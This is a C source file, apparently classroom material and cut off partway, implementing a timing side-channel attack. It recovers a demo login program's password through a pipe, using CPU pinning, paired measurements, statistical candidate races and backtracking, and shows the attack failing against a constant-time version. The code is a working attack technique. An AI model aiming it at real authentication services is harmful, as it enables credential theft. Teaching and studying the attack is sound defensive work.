/*
 * attack.c — a timing side-channel attacker that treats the login program as a
 * BLACK BOX. It spawns the target (login / login_safe) as a child process and
 * talks to it only through a pipe: it sends a guess, reads "granted"/"denied",
 * and times the round-trip. It NEVER sees the secret — the secret lives in the
 * other program's memory. All it has is a stopwatch.
 *
 *   ./attack ./login              step through the attack by hand (manual — the DEFAULT)
 *   ./attack ./login auto  [len]  run the whole recovery automatically instead
 *   ./attack ./login manual [len] manual mode, stated explicitly (same as the default)
 *   ./attack ./login_safe         run the SAME attack against the fixed program
 *                                 — and watch it fail
 *
 * Manual mode is the default: it has an `auto` command, so it's the superset —
 * you can feel the timing by hand and then hand the rest to the automatic run.
 * `len` is optional — the attacker discovers the password length by timing. Give
 * a number to skip that probe. Ctrl-C stops the attack at any time.
 *
 * Extra words that change how careful the run is:
 *   fast | careful | paranoid   sampling budget (default: careful)
 *   nopin                       don't pin the processes to one CPU (Linux)
 *
 * ── WHY THIS IS HARDER THAN IT LOOKS, AND WHAT THE CODE DOES ABOUT IT ───────
 *
 * One matched byte costs a FIXED amount of work (~20-50 us with login.c's
 * amplifier). But by the time we are guessing character k, every guess already
 * pays for k matched bytes, so a measurement takes O + k*W and we are hunting a
 * W-sized difference inside it.
 *
 * The noise on that measurement is not a fixed number of microseconds — it is a
 * PERCENTAGE. The two processes ping-pong through a pipe and are blocked most of
 * the time, so the CPU governor keeps the clock low and wandering, and the
 * scheduler drifts them between cores. Measured here: the timing wanders by
 * 15-25% of whatever is being measured, and it drifts SLOWLY (consecutive
 * measurements are ~0.6 correlated), so simply taking the minimum of 200 samples
 * does not converge — the floor itself moves by more than one byte's work.
 *
 * Signal stays flat at W. Noise grows like 0.2*(O + k*W). So the attack gets
 * harder the deeper it goes, and a plain "time each character, pick the slowest"
 * sweep starts guessing wrong somewhere around position 8-12. That is exactly
 * the failure this file is built to survive. Three defences, in order of how
 * much they buy:
 *
 *   1. KILL THE DRIFT AT THE SOURCE (pin_processes, Linux). Both processes are
 *      pinned to ONE core. A blocking ping-pong looks idle to the CPU governor;
 *      sharing a core keeps that core continuously runnable, so the clock stays
 *      up and stops wandering, and the pair never migrates.
 *
 *   2. MEASURE A DIFFERENCE, NOT A TIME (estimate). Each candidate is timed in a
 *      tight interleaved burst against a REFERENCE byte the secret cannot
 *      contain. Keeping the minimum of each side discards scheduler spikes;
 *      subtracting cancels the slow drift both sides shared. What is left is the
 *      quantity we actually want: the cost of one extra matched byte, or zero.
 *
 *   3. NEVER TRUST ONE PASS (race, verify_char_n, measure_steps). Candidates are
 *      raced: everyone is re-measured, the clear losers are eliminated, and the
 *      survivors are re-measured again until the leader is three standard errors
 *      clear — or the budget runs out and the pick is flagged as shaky. Winning
 *      a race only means "slower than the other 73", so the winner is then asked
 *      a second, independent question before anything is built on it: on its
 *      own, does this character add one byte's work? Anything that still slips
 *      through is caught later — the next position goes flat, the per-character
 *      re-check finds the step that does not rise, or the final submit comes
 *      back denied. Each of those rewinds the attack, forbids the bad character
 *      and tries again.
 *
 * POSIX C — builds and runs on Linux (Kali) and macOS alike. Needs -lm.
 */

/* Must come before EVERY system header, not just <sched.h>: glibc decides what
 * to expose the first time any header pulls in <features.h>, so defining this
 * later is too late and CPU_ZERO / CPU_SET / sched_setaffinity stay hidden.
 * Harmless on macOS, which ignores it. */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <signal.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/resource.h>

/* ── tunables ───────────────────────────────────────────────────────────── */
#define BURST        8      /* round-trips per side inside ONE paired estimate  */
#define BASE_EST    56      /* estimates position 0 gets on its first attempt   */
#define DEPTH_SCALE  8.0    /* ...growing with depth: +1x budget every N places */
#define MAX_EST    320      /* hard cap once depth and retries raise the budget */
#define EST0         4      /* estimates EVERY candidate gets before any culling */
#define FINAL_FIELD  3      /* never cull below this many; then duel to the end  */
#define ELIM_K     2.5      /* cull only what is this many SE behind the leader  */
#define MIN_N        8      /* never call a position decided on fewer than this  */
#define FLAT_N      32      /* ...nor call it flat on fewer than this            */
#define CONFIDENCE 3.0      /* leader must clear the runner-up by this many SE  */
#define SIGNAL_FRAC 0.40    /* ...and rise this fraction of one byte's work     */
#define SHOW_N       8      /* candidates drawn per position                    */
#define BAR_WIDTH   42
#define MAXLEN     256
#define WARMUP       6      /* throwaway round-trips before anything is measured */
#define MAX_BACKTRACKS 12   /* wrong locks a run may undo before giving up      */
#define MAX_REPAIRS     6   /* verify-and-repair passes after a denied submit   */
#define VERIFY_EST     24   /* estimates per character in the verification pass  */
#define CONFIRM_EST    16   /* estimates spent confirming a pick before moving on */
#define CONFIRM_FRAC 0.25   /* ...which must reach this fraction of one byte's work */
#define DETECT_SAMPLES 24   /* lighter sampling for the length probe            */
#define DETECT_MAXLEN  40   /* longest password the auto-probe will consider    */
#define DETECT_BUDGET  8.0  /* seconds: give up probing after this              */

/* A byte no password contains, used as the reference every candidate is timed
 * against. It cannot match the secret, so it always costs exactly "the prefix
 * and nothing more" — the baseline we subtract away. */
#define REF_BYTE '\x01'

static const char CHARSET[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_";

#define C_RESET  "\033[0m"
#define C_WIN    "\033[1;32m"
#define C_DIM    "\033[2m"
#define C_CYAN   "\033[36m"
#define C_YELLOW "\033[33m"

/* Set by Ctrl-C so an unbounded attack (or a long probe) stops when the user
 * decides to — not by killing the process. Long loops poll it between guesses. */
static volatile sig_atomic_t g_stop = 0;
static void on_sigint(int sig) { (void)sig; g_stop = 1; }

/* Sampling budget, scaled by the `fast`/`careful`/`paranoid` word. */
static double g_effort = 1.0;

/* Running estimate of what ONE matched byte costs, in ns. Everything that has
 * to judge "is this a real signal or noise?" is expressed as a fraction of it,
 * so the thresholds hold whether a byte is worth 5 us or 500 us. */
static double g_work = 0.0;

/* Tallies, reported at the end — the class can see how much of the run was
 * spent doubting itself. */
static long g_asks = 0;
static int  g_rechecks = 0, g_backtracks = 0, g_repairs = 0;

/* Characters ruled out at a position by a failed attempt. Cleared whenever an
 * earlier position changes, because a ban only ever made sense under the prefix
 * that was standing at the time. */
static unsigned char g_banned[MAXLEN][256];

/* ── the pipe to the target co-process ──────────────────────────────────── */
static FILE  *to_target;     /* we write guesses here          */
static FILE  *from_target;   /* we read verdicts here          */
static pid_t  target_pid;
static int    g_dead = 0;    /* target died: every timing after this is a lie  */

/* Pin this process to one CPU. Called in BOTH the attacker and the target, with
 * the same CPU, on purpose: the two processes strictly alternate, so sharing a
 * core means that core is always runnable. The governor therefore keeps it at a
 * high, steady clock instead of treating a blocked ping-pong as an idle system,
 * and neither process ever migrates. That drift is the single largest source of
 * timing noise here, so this is the cheapest big win available. */
#ifdef __linux__
#include <sched.h>
static int g_pin = 1;
static void pin_processes(void) {
    if (!g_pin) return;
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    int cpu = (ncpu > 1) ? (int)(ncpu - 1) : 0;   /* the last core: least likely to serve IRQs */
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}
#else
static int g_pin = 0;
static void pin_processes(void) { }
#endif

static void spawn_target(const char *path) {
    int in[2], out[2];                 /* in: attacker->target ; out: target->attacker */
    if (pipe(in) || pipe(out)) { perror("pipe"); exit(1); }
    target_pid = fork();
    if (target_pid < 0) { perror("fork"); exit(1); }
    if (target_pid == 0) {                       /* child = the target program */
        setpgid(0, 0);            /* own process group: Ctrl-C hits the attacker, not the target */
        pin_processes();          /* same core as the attacker — see above */
        dup2(in[0], STDIN_FILENO);
        dup2(out[1], STDOUT_FILENO);
        close(in[0]); close(in[1]); close(out[0]); close(out[1]);
        execl(path, path, (char *)NULL);
        perror("exec (is the path right? try ./login)");
        _exit(127);
    }
    close(in[0]); close(out[1]);
    to_target   = fdopen(in[1], "w");
    from_target = fdopen(out[0], "r");
    if (!to_target || !from_target) { perror("fdopen"); exit(1); }
    pin_processes();
}

static void reap_target(void) {
    if (to_target)   fclose(to_target);          /* EOF => target exits its loop */
    if (from_target) fclose(from_target);
    if (target_pid > 0) waitpid(target_pid, NULL, 0);
}

/* Send one guess, wait for the verdict line, return the elapsed nanoseconds.
 * *granted (if non-NULL) is set from the reply. UINT64_MAX means the target
 * died — a real error, not a timing. */
static uint64_t ask(const char *guess, int *granted) {
    struct timespec a, b;
    char resp[64];
    g_asks++;
    clock_gettime(CLOCK_MONOTONIC_RAW, &a);
    if (fprintf(to_target, "%s\n", guess) < 0 || fflush(to_target) != 0) {
        if (granted) *granted = 0;
        g_dead = 1; g_stop = 1;
        return UINT64_MAX;
    }
    if (!fgets(resp, sizeof resp, from_target)) {
        if (granted) *granted = 0;
        g_dead = 1; g_stop = 1;
        return UINT64_MAX;
    }
    clock_gettime(CLOCK_MONOTONIC_RAW, &b);
    if (granted) *granted = (strstr(resp, "granted") != NULL);
    return (uint64_t)(b.tv_sec - a.tv_sec) * 1000000000ull + (b.tv_nsec - a.tv_nsec);
}

/* Build a guess: the recovered prefix, `ch` at `pos`, filler to `len`. */
static void build_guess(char *out, const char *recovered, size_t pos, char ch, size_t len) {
    memcpy(out, recovered, pos);
    out[pos] = ch;
    for (size_t f = pos + 1; f < len; f++) out[f] = '.';
    out[len] = '\0';
}

/* ── the measurement ────────────────────────────────────────────────────────
 * ONE estimate of "how much EXTRA work does `ch` cause at this position?"
 *
 * The candidate and a reference byte are timed in one tight interleaved burst.
 * Two things happen at once:
 *   - keeping the MINIMUM of each side throws away scheduler spikes (a preempted
 *     run is always slower than an uninterrupted one, never faster);
 *   - subtracting the two cancels the slow CPU-frequency drift, because both
 *     sides were measured microseconds apart and shared the same clock.
 * The order is flipped every iteration so that "went first" cannot bias either
 * side. Result: ~one byte's work if `ch` is the secret's character here, ~0 if
 * it is not — with none of the prefix's cost, and none of its noise. */
static double estimate(const char *recovered, size_t pos, size_t len,
                       char ch, int burst, int *granted) {
    char gc[MAXLEN], gr[MAXLEN];
    build_guess(gc, recovered, pos, ch, len);
    build_guess(gr, recovered, pos, REF_BYTE, len);
    uint64_t mc = UINT64_MAX, mr = UINT64_MAX;
    for (int b = 0; b < burst && !g_stop; b++) {
        uint64_t t; int gr_flag = 0;
        if (b & 1) {
            t = ask(gc, &gr_flag); if (t < mc) mc = t;
            t = ask(gr, NULL);     if (t < mr) mr = t;
        } else {
            t = ask(gr, NULL);     if (t < mr) mr = t;
            t = ask(gc, &gr_flag); if (t < mc) mc = t;
        }
        if (gr_flag && granted) *granted = 1;
    }
    if (mc == UINT64_MAX || mr == UINT64_MAX) return 0.0;
    return (double)mc - (double)mr;
}

/* Warm the pipe, the caches and the CPU's clock ramp: the first few round-trips
 * after an idle moment are always slow, and they would poison a minimum. */
static void warmup(const char *recovered, size_t pos, size_t len) {
    char g[MAXLEN];
    build_guess(g, recovered, pos, REF_BYTE, len);
    for (int i = 0; i < WARMUP && !g_stop; i++) ask(g, NULL);
}

/* ── robust statistics ──────────────────────────────────────────────────────
 * Median and MAD, not mean and standard deviation: the timing distribution has
 * a long right tail (every preemption lands there) and a mean would follow it. */
static int dcmp(const void *a, const void *b) {
    double x = *(const double *)a, y = *(const double *)b;
    return (x > y) - (x < y);
}
static double dmedian(const double *v, int n) {
    double c[MAX_EST];
    memcpy(c, v, (size_t)n * sizeof(double));
    qsort(c, (size_t)n, sizeof(double), dcmp);
    return (n & 1) ? c[n / 2] : 0.5 * (c[n / 2 - 1] + c[n / 2]);
}
/* Standard error of that median, from the MAD. 1.4826 rescales a MAD to a
 * standard deviation for normal-ish data; 1.253 is the median's penalty over
 * the mean. Together they say how far the median could still move if we kept
 * sampling — which is exactly what "am I sure yet?" needs to know. */
static double dspread(const double *v, int n, double med) {
    double c[MAX_EST];
    for (int i = 0; i < n; i++) c[i] = fabs(v[i] - med);
    qsort(c, (size_t)n, sizeof(double), dcmp);
    double mad = (n & 1) ? c[n / 2] : 0.5 * (c[n / 2 - 1] + c[n / 2]);
    return 1.4826 * mad;
}
static double dstderr(const double *v, int n, double med) {
    return 1.253 * dspread(v, n, med) / sqrt((double)n);
}

/* ── the race ───────────────────────────────────────────────────────────────
 * Every candidate is measured, the hopeless are dropped, the survivors are
 * measured AGAIN — repeatedly, until one is three standard errors clear of the
 * field. This is the "sweep again" step: the first pass only narrows the field,
 * it never decides. Sampling that would have been spread thinly over 74
 * characters is concentrated on the handful that could still be the answer. */
typedef struct {
    char   ch;
    double s[MAX_EST];   /* the estimates collected so far, ns of extra work */
    int    n;
    double score, se;    /* median and its standard error                    */
} Racer;

static Racer g_race[128];

typedef struct {
    char   ch;
    int    granted;      /* the target said "Access granted": certainty       */
    int    has_signal;   /* the leader really does rise above the pack        */
    int    confident;    /* ...and is far enough clear of the runner-up       */
    int    flat_certain; /* provably nothing here — not merely "unclear"      */
    int    rounds;       /* estimates spent on the leader                     */
    double lead, se;     /* leader minus runner-up, and the error on that     */
    double rise;         /* leader minus the pack: one byte's work, or noise  */
    double rise_se;      /* the error on that rise                            */
    double pack;         /* what "no match" measures here — should be ~0      */
    Racer  top[SHOW_N];  /* for drawing                                       */
    size_t ntop;
} Pick;

static int racer_desc(const void *a, const void *b) {
    double x = ((const Racer *)a)->score, y = ((const Racer *)b)->score;
    return (y > x) - (y < x);
}

/* How big a rise counts as "a byte matched here" rather than noise. Expressed
 * against the measured cost of one byte once we know it; before that, against a
 * small absolute floor so the very first position still has a rule. */
static double signal_floor(void) { return g_work > 0 ? SIGNAL_FRAC * g_work : 3000.0; }

static Pick race(const char *recovered, size_t pos, size_t len,
                 const unsigned char *banned, double budget_mult) {
    Pick p;
    memset(&p, 0, sizeof p);

    size_t nchars = strlen(CHARSET), alive = 0;
    for (size_t c = 0; c < nchars; c++) {
        unsigned char ch = (unsigned char)CHARSET[c];
        if (banned && banned[ch]) continue;
        g_race[alive].ch = (char)ch;
        g_race[alive].n = 0;
        g_race[alive].score = g_race[alive].se = 0;
        alive++;
    }
    if (alive == 0) return p;                 /* every character ruled out here */

    warmup(recovered, pos, len);

    /* Deeper positions need more evidence, and not by a little: the signal stays
     * at one byte's work while the measurement it hides in grows by one byte per
     * position, so the sampling needed to resolve it grows faster still. Spending
     * the same budget everywhere means the early positions are wasteful and the
     * late ones are hopeless — which is exactly how the old sweep behaved. */
    int cap = (int)(BASE_EST * g_effort * budget_mult * (1.0 + pos / DEPTH_SCALE));
    if (cap > MAX_EST) cap = MAX_EST;
    if (cap < MIN_N * 2) cap = MIN_N * 2;

    /* EVERY candidate gets EST0 estimates before anyone is cut. One estimate is
     * far too noisy to rank on — culling that early is exactly how the true
     * character gets thrown away before it can speak. */
    int add = EST0;
    int granted_seen = 0;
    char granted_ch = 0;
    double pack0 = 0.0;          /* the "no match" level, measured on the FULL field */
    int have_pack = 0;

    for (;;) {
        /* A wide field only has to be ranked well enough that the truth survives
         * the cull, so it is measured with short bursts; the survivors — where
         * the decision actually happens — get the long ones. */
        int burst = (alive > 24) ? 3 : (alive > 8 ? 5 : BURST);
        for (int e = 0; e < add && !g_stop; e++)
            for (size_t i = 0; i < alive && !g_stop; i++) {
                if (g_race[i].n >= cap) continue;
                int gr = 0;
                g_race[i].s[g_race[i].n++] =
                    estimate(recovered, pos, len, g_race[i].ch, burst, &gr);
                if (gr) { granted_seen = 1; granted_ch = g_race[i].ch; }
            }
        if (g_stop || g_dead) break;

        if (granted_seen) {                   /* no statistics needed: it opened the door */
            p.ch = granted_ch;
            p.granted = p.has_signal = p.confident = 1;
            break;
        }

        /* Every candidate here is measured by the same machine through the same
         * pipe, so they all share ONE noise process. Estimating its size from the
         * whole field (a pooled spread) is far steadier than trusting each
         * candidate's own handful of samples — and it does not collapse to a
         * bogus "zero uncertainty" when a candidate has only a few. */
        double sds[128];
        for (size_t i = 0; i < alive; i++) {
            g_race[i].score = dmedian(g_race[i].s, g_race[i].n);
            sds[i] = dspread(g_race[i].s, g_race[i].n, g_race[i].score);
        }
        double sd_pool = dmedian(sds, (int)alive);
        for (size_t i = 0; i < alive; i++)
            g_race[i].se = 1.253 * sd_pool / sqrt((double)g_race[i].n);
        qsort(g_race, alive, sizeof(Racer), racer_desc);

        int n    = g_race[0].n;
        p.rounds = n;
        p.lead   = (alive > 1) ? g_race[0].score - g_race[1].score : g_race[0].score;
        p.se     = (alive > 1) ? sqrt(g_race[0].se * g_race[0].se + g_race[1].se * g_race[1].se)
                               : g_race[0].se;
        /* The pack: what a NON-matching character measures here — the level the
         * winner has to stand above. It is read once, off the full field, where
         * the middle of the pack is genuinely made of non-matching characters.
         * Re-reading it later would be wrong: by then only contenders are left,
         * and the runner-up would masquerade as the baseline. */
        if (!have_pack) { pack0 = g_race[alive / 2].score; have_pack = 1; }
        p.pack = pack0;
        p.rise = g_race[0].score - p.pack;
        p.ch   = g_race[0].ch;

        /* Is there a byte match here AT ALL? Two different questions, depending
         * on whether we already know what a match is worth:
         *
         *   - Once one byte's cost has been measured, that is a PHYSICAL yardstick
         *     and the honest test is simply "is the leader anywhere near it".
         *   - Before that (nothing found yet, e.g. a constant-time target), there
         *     is no yardstick, so the only available test is statistical: the
         *     leader must stand clear of the pack by more than the measurement's
         *     own uncertainty. One of 74 noisy numbers is always the largest;
         *     that alone must never count as a leak. */
        p.rise_se = 1.253 * sd_pool * sqrt(2.0 / n);
        p.has_signal = (g_work > 0) ? (p.rise >= signal_floor())
                                    : (p.rise >= CONFIDENCE * p.rise_se);

        /* "Nothing here" is a destructive conclusion — it rewinds the chain — so
         * it needs its own, stricter standard: the rise must be below the bar
         * even after allowing for the error on it. Anything in between is
         * INCONCLUSIVE, and inconclusive must never be treated as proof. */
        p.flat_certain = (g_work > 0)
            ? (p.rise + CONFIDENCE * p.rise_se < signal_floor())
            : (p.rise < CONFIDENCE * p.rise_se);

        /* A matched byte costs ONE byte's work — no more. A leader sitting far
         * above that has not found a better match, it has caught a disturbance,
         * so it is not accepted while there is budget left to measure it again. */
        int plausible = (g_work <= 0) || (p.rise <= 2.5 * g_work);

        p.confident = p.has_signal && plausible && n >= MIN_N
                      && (p.lead >= CONFIDENCE * p.se);

        if (p.confident) break;                            /* decided */
        if (n >= cap) break;                               /* out of budget */
        if (alive <= FINAL_FIELD && !p.has_signal && n >= FLAT_N)
            break;                    /* genuinely flat: more sampling won't conjure a signal */

        /* Cull only what the evidence has actually ruled out — a candidate whose
         * score is ELIM_K standard errors behind the leader cannot still be the
         * answer. Never cut more than half in one stage, so a single unlucky
         * stage can't drop the true character. */
        if (alive > FINAL_FIELD) {
            double margin = ELIM_K * 1.253 * sd_pool * sqrt(2.0 / n);
            double thresh = g_race[0].score - margin;
            size_t keep = 0;
            for (size_t i = 0; i < alive; i++) if (g_race[i].score >= thresh) keep++;
            size_t half = (alive + 1) / 2;
            if (keep < half)        keep = half;
            if (keep < FINAL_FIELD) keep = FINAL_FIELD;
            if (keep < alive)       { alive = keep; g_rechecks++; }
        }
        add = (add < 16) ? add * 2 : 16;       /* survivors earn more scrutiny */
    }

    /* The granted case needs no chart — the target already said yes. */
    if (!p.granted)
        for (size_t i = 0; i < alive && i < SHOW_N; i++) p.top[p.ntop++] = g_race[i];

    /* Keep the estimate of one byte's cost current — but ONLY from picks that
     * were actually decided, never from a shaky one. Everything that judges
     * "signal or noise?" is measured against this number, so letting a noisy
     * reading set it would let the attack talk itself into believing in a leak
     * that isn't there. */
    if (p.confident && !p.granted && p.rise > 0) {
        if (g_work <= 0) {
            g_work = p.rise;
        } else {
            /* Clamp what is allowed to move it. One byte's cost is a property of
             * the target, not of the weather, so a reading far from the current
             * value is a disturbed measurement and must not drag the yardstick
             * with it — a yardstick that creeps upward starts calling genuine
             * matches "flat", which is how a good chain gets torn down. */
            double r = p.rise;
            if (r > 1.5 * g_work) r = 1.5 * g_work;
            if (r < 0.5 * g_work) r = 0.5 * g_work;
            g_work = 0.9 * g_work + 0.1 * r;
        }
    }
    return p;
}

/* ── visualization ──────────────────────────────────────────────────────── */
static void draw_bar(char ch, double score, double se, double hi, int winner) {
    double v = score > 0 ? score : 0;
    int n = (hi > 0) ? (int)(v / hi * BAR_WIDTH + 0.5) : 0;
    if (n > BAR_WIDTH) n = BAR_WIDTH;
    char shown = (ch >= 32 && ch < 127) ? ch : '?';
    printf("   %s%c%s  ", winner ? C_WIN : C_DIM, shown, C_RESET);
    fputs(winner ? C_WIN : C_DIM, stdout);
    for (int i = 0; i < n; i++)         fputs("█", stdout);
    for (int i = n; i < BAR_WIDTH; i++) putchar(' ');
    printf("%s %+7.1f ±%4.1f us%s\n", winner ? C_WIN : C_DIM,
           score / 1000.0, se / 1000.0, C_RESET);
}

static void work_text(char *buf, size_t n) {
    if (g_work > 0) snprintf(buf, n, "~%.1f us", g_work / 1000.0);
    else            snprintf(buf, n, "not calibrated yet");
}

static void draw_pick(const Pick *p, size_t pos, const char *shown, int accepted) {
    printf("\n" C_CYAN "position %zu" C_RESET "  (locked in so far: \"" C_WIN "%s" C_RESET "\")\n",
           pos, shown);
    if (p->ntop) {
        double hi = p->top[0].score > 0 ? p->top[0].score : 1;
        for (size_t i = 0; i < p->ntop; i++)
            draw_bar(p->top[i].ch, p->top[i].score, p->top[i].se, hi, accepted && i == 0);
    }
    if (p->granted) {
        printf("   " C_WIN "-> '%c' — the target answered \"Access granted\". "
               "Certainty, not statistics." C_RESET "\n", p->ch);
        return;
    }
    char w[64]; work_text(w, sizeof w);
    if (!accepted) {
        printf("   " C_YELLOW "-> flat. The leader is only %.1f us above the pack — inside the "
               "measurement's own\n      uncertainty, so no character here does extra work.",
               p->rise / 1000.0);
        if (g_work > 0) printf("  (A match would be worth %s.)", w);
        if (pos > 0) printf("\n      The prefix we are standing on must be wrong.");
        printf(C_RESET "\n");
        return;
    }
    printf("   -> '%c' costs " C_WIN "%+.1f us" C_RESET " of extra work (one matched byte is %s); "
           "leads the runner-up by %.1f SE.\n",
           p->ch, p->rise / 1000.0, w, p->se > 0 ? p->lead / p->se : 99.0);
    printf("   " C_DIM "   settled after %d re-measurements each; the field was cut down %s."
           C_RESET "\n", p->rounds, p->confident ? "until the leader was 3 SE clear"
                                                 : "but the budget ran out first — this pick is shaky");
}

static void banner(const char *target, size_t len, size_t nchars, const char *mode) {
    printf(C_CYAN "\n╔══════════════════════════════════════════════════════════╗\n");
    printf(       "║        TIMING SIDE-CHANNEL ATTACK — live recovery        ║\n");
    printf(       "╚══════════════════════════════════════════════════════════╝" C_RESET "\n\n");
    printf("Target program : " C_YELLOW "%s" C_RESET "   (a black box — we only time its replies)\n", target);
    printf("Mode           : " C_YELLOW "%s" C_RESET "\n", mode);
    printf("The attacker never sees the secret. It only sends guesses and times them.\n\n");
    if (len > 0) {
        printf("   Brute force needs up to  " C_YELLOW "%zu^%zu" C_RESET "  guesses.\n", nchars, len);
        printf("   Timing attack needs only " C_YELLOW "%zu x %zu = %zu" C_RESET " positions to pin down.\n",
               nchars, len, nchars * len);
    } else {
        printf("   " C_YELLOW "Password length unknown" C_RESET
               " — recovering position by position until you stop (Ctrl-C).\n");
    }
}

/* ── calibration ────────────────────────────────────────────────────────────
 * Before attacking, measure the two numbers that decide whether the attack can
 * work at all on this machine: what one matched byte costs, and how much the
 * timing wanders. Printing them turns "it didn't work" into a diagnosis. */
static void calibrate(size_t len) {
    if (len == 0) return;
    printf("\n" C_CYAN "Calibrating this machine" C_RESET "\n");
    char g[MAXLEN];
    for (size_t f = 0; f < len; f++) g[f] = '.';
    g[len] = '\0';
    warmup("", 0, len);

    /* Time ONE unchanging guess over and over. Everything about it is constant —
     * same bytes, same code path, same amount of work — so every difference in
     * the numbers that come back is noise, and we get to measure it directly. */
    double t[128];
    int nt = 0;
    uint64_t floor_ns = UINT64_MAX;
    for (int i = 0; i < 128 && !g_stop; i++) {
        uint64_t x = ask(g, NULL);
        if (x < floor_ns) floor_ns = x;
        t[nt++] = (double)x;
    }
    double med = nt ? dmedian(t, nt) : 0;
    double spread = nt ? dspread(t, nt, med) : 0;
    double wander = med > 0 ? 100.0 * spread / med : 0;

    printf("   round-trip floor   %8.1f us   (a guess that matches nothing)\n", floor_ns / 1000.0);
    if (g_work > 0)
        printf("   one matched byte   %8.1f us   " C_DIM "<- the whole signal" C_RESET "\n",
               g_work / 1000.0);
    printf("   timing wander      %8.1f %%    (of whatever is being measured)\n", wander);

    /* The uncomfortable arithmetic, stated plainly: the signal is a fixed number
     * of microseconds, the noise is a percentage of a measurement that grows by
     * one byte's work at every position. So the attack gets harder as it goes. */
    if (g_work > 0 && wander > 0) {
        double deep  = floor_ns + (double)(len - 1) * g_work;
        double share = 100.0 * g_work / deep;
        printf("   " C_DIM "-> at position %zu one matched byte is only %.1f%% of the measurement,\n"
               "      against %.1f%% wander. That is why each character is decided by\n"
               "      repeated paired measurements and then re-checked, not by one sweep."
               C_RESET "\n", len - 1, share, wander);
        if (share < wander / 8.0)
            printf("   " C_YELLOW "-> this machine is noisy for a %zu-character secret; expect "
                   "re-checks and repairs.\n      `paranoid` buys more sampling; a shorter SECRET "
                   "buys far more than that." C_RESET "\n", len);
    }
    printf("\n");
}

/* ── length discovery (no prior knowledge of the secret) ────────────────────
 * At the CORRECT length, sweeping position 0 makes exactly ONE character slow
 * (it matched one byte before the early return) while every other character
 * returns at the floor. At any WRONG length the check bails immediately
 * (n != secret_len) for every character, so the sweep is flat. A constant-time
 * target is flat at every length too.
 *
 * This is the one measurement in the whole attack with a huge signal-to-noise
 * ratio: a wrong length costs almost nothing, so one matched byte stands out
 * enormously against it. That is why a plain minimum is good enough here. */
typedef struct { char ch; uint64_t t; } Timed;
static int timed_desc(const void *a, const void *b) {
    uint64_t x = ((const Timed *)a)->t, y = ((const Timed *)b)->t;
    return (y > x) - (y < x);
}

static char probe_length(size_t L, int samples, uint64_t *o_top1,
                         uint64_t *o_top2, uint64_t *o_med) {
    size_t nchars = strlen(CHARSET);
    Timed c[128];
    char guess[MAXLEN];
    for (size_t i = 0; i < nchars; i++) { c[i].ch = CHARSET[i]; c[i].t = UINT64_MAX; }
    for (int s = 0; s < samples && !g_stop; s++)
        for (size_t i = 0; i < nchars; i++) {
            guess[0] = c[i].ch;
            for (size_t f = 1; f < L; f++) guess[f] = '.';
            guess[L] = '\0';
            uint64_t t = ask(guess, NULL);
            if (t < c[i].t) c[i].t = t;
        }
    qsort(c, nchars, sizeof(Timed), timed_desc);
    *o_top1 = c[0].t; *o_top2 = c[1].t; *o_med = c[nchars / 2].t;
    return c[0].ch;
}

/* The tell is a single lone outlier: the length whose slowest character sits far
 * above its SECOND-slowest. Ordinary jitter never manufactures one clean outlier
 * the way a real byte-match does, so this rejects both wrong lengths and
 * constant-time targets. The winner is then re-probed with more samples before
 * we commit to it. Returns 1 and sets *out on success. */
static int detect_length(size_t *out, double budget_sec) {
    uint64_t best_gap = 0, second_gap = 0;
    size_t best_len = 1;
    struct timespec t0; clock_gettime(CLOCK_MONOTONIC, &t0);

    for (size_t L = 1; L <= DETECT_MAXLEN && !g_stop; L++) {
        fprintf(stderr, "\r   probing length %2zu/%d ...", L, DETECT_MAXLEN);
        fflush(stderr);
        uint64_t t1, t2, md;
        probe_length(L, DETECT_SAMPLES, &t1, &t2, &md);
        uint64_t gap = t1 - t2;
        if (gap > best_gap)        { second_gap = best_gap; best_gap = gap; best_len = L; }
        else if (gap > second_gap) { second_gap = gap; }

        /* Stop early if the user interrupts, or the time budget is spent. The
         * budget only bites on a SLOW target — i.e. one whose every guess costs
         * full work, which is exactly the constant-time (non-leaking) case. A
         * leaky target's wrong-length guesses return instantly, so it finishes
         * the whole sweep in a fraction of a second and is never timed out. */
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed = (now.tv_sec - t0.tv_sec) + (now.tv_nsec - t0.tv_nsec) / 1e9;
        if (elapsed > budget_sec) break;
    }
    fprintf(stderr, "\r%40s\r", "");

    /* Scale-free 4x test (rejects the uniformly-noisy constant-time case) plus a
     * small absolute floor (rejects the no-amplifier / no-signal case). */
    if (!(best_gap > 3000 && best_gap >= 4 * (second_gap + 1))) return 0;

    fprintf(stderr, "\r   confirming length %zu ...", best_len);
    fflush(stderr);
    uint64_t t1, t2, md;
    probe_length(best_len, DETECT_SAMPLES * 3, &t1, &t2, &md);
    fprintf(stderr, "\r%40s\r", "");
    if (!(t1 - t2 > 3000 && (t1 - t2) >= 2 * (t2 - md + 1))) return 0;

    g_work = (double)(t1 - md);          /* one matched byte, measured for free */
    *out = best_len;
    return 1;
}

static void explain_detection(size_t len) {
    printf(C_DIM
        "   How the length was found: for each candidate length L, the attacker sent\n"
        "   one guess per character (that character at position 0, filler after) and\n"
        "   timed it. At the TRUE length exactly one character runs slow — it matched\n"
        "   a byte before the vulnerable early-exit — while every WRONG length returns\n"
        "   instantly for every character (the `n != secret_len` check fails first).\n"
        "   Length %zu was the one length with that lone slow outlier, and re-probing\n"
        "   it with more samples reproduced the same outlier.\n" C_RESET, len);
}

/* ── verification: does each recovered character really match? ───────────────
 * Independent of how the character was picked. For character k we compare two
 * guesses that differ only in whether the check gets past position k-1:
 *
 *     A = recovered[0..k-1] + wrong byte + filler     (k bytes matched, if k-1 is right)
 *     B = recovered[0..k-2] + wrong byte + filler     (k-1 bytes matched)
 *
 * A - B is one byte's work if recovered[k-1] is correct, and zero if it is not.
 * Measured as a paired burst difference, so the same drift cancellation applies.
 * This is what finds the bad character after a denied submit — and it tests each
 * character on its own, rather than trusting the sweep that chose it. */
static double verify_char_n(const char *recovered, size_t k, size_t len,
                            double *se_out, int est) {
    char a[MAXLEN], b[MAXLEN];
    /* a reference byte at the tested position, and one position earlier */
